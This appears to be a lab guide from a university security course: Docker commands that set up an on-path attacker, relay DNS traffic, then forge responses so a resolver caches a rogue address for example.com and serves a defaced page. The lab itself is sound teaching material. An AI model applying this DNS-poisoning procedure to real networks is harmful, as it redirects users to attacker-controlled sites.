# Phase 2 — On-Path Response Forgery

## Architecture & Attack Position
An adversary is positioned at `172.16.2.100` on the resolver subnet. Inbound authoritative responses destined for the resolver (`172.16.2.10`) are diverted through the attacker via a static host route installed on `core-router`. The interceptor program (`src/interceptor.c`), written in C using `libpcap`, captures inbound DNS packets and selectively crafts and injects spoofed responses.

## Build and Deployment
1. Start the containers:
   ```bash
   sudo docker build -t cs6008-dns-lab:local -f ../common/Dockerfile ..
   sudo docker compose up -d
   ```
2. Build the attacker C interceptor binary:
   ```bash
   sudo docker compose exec -T attacker /scripts/build-attacker.sh
   ```

## Verification 2.2 — Transparent Relay
1. Run the interceptor in relay mode:
   ```bash
   sudo docker compose exec -d attacker sh -c 'exec /usr/local/bin/interceptor --relay > /evidence/relay.log 2>&1'
   sudo docker compose exec -T core-router /scripts/divert-on.sh
   ```
2. Flush the resolver and test:
   ```bash
   sudo docker compose exec -T resolver rndc -k /run/named/rndc.key -s 127.0.0.1 flush
   sudo docker compose exec -T client dig example.com A +time=3 +tries=1
   sudo docker compose exec -T client curl -s http://example.com/
   ```
   Both return legitimate results (`172.16.1.20`).
3. Stop the relay:
   ```bash
   sudo docker compose exec -T attacker pkill -x interceptor || true
   ```

## Attack 2.3 — Active Poisoning
1. Start tcpdump capture on `core-router`:
   ```bash
   IFACE=$(sudo docker compose exec -T core-router sh -c 'ip -o -4 addr show' | grep -oE 'eth[0-9]+ +inet 172\.16\.2\.' | grep -oE 'eth[0-9]+' | head -1)
sudo docker compose exec -d core-router sh -c "exec tcpdump -i $IFACE -nn -s0 -c 300 -w /evidence/p2-attack.pcap 'udp port 53' > /evidence/p2-tcpdump.log 2>&1"
   sleep 1   # let tcpdump finish opening the socket before traffic flows, or it misses the capture window
   ```
2. Run the interceptor in forge mode:
   ```bash
   sudo docker compose exec -d attacker sh -c 'exec /usr/local/bin/interceptor --forge > /evidence/interceptor-forge.log 2>&1'
   ```
3. Flush resolver cache:
   ```bash
   sudo docker compose exec -T resolver rndc -k /run/named/rndc.key -s 127.0.0.1 flush
   ```
4. Verify target poisoning:
   ```bash
   sudo docker compose exec -T client dig example.com A +time=3 +tries=1
   sudo docker compose exec -T client curl --noproxy '*' --fail --show-error --max-time 10 http://example.com/
   ```
   Resolves to rogue IP `172.16.1.30` and displays the defaced website.
5. Verify non-target lookup remains unaffected:
   ```bash
   sudo docker compose exec -T client dig www.example.com A +time=3 +tries=1
   sudo docker compose exec -T client curl --noproxy '*' --fail --show-error --max-time 10 http://www.example.com/
   ```
   Resolves to legitimate IP `172.16.1.20`.
6. Teardown attack:
   ```bash
   sudo docker compose exec -T attacker pkill -x interceptor || true
   sudo docker compose exec -T core-router pkill -INT -x tcpdump || true
   sudo docker compose exec -T core-router /scripts/divert-off.sh
   ```
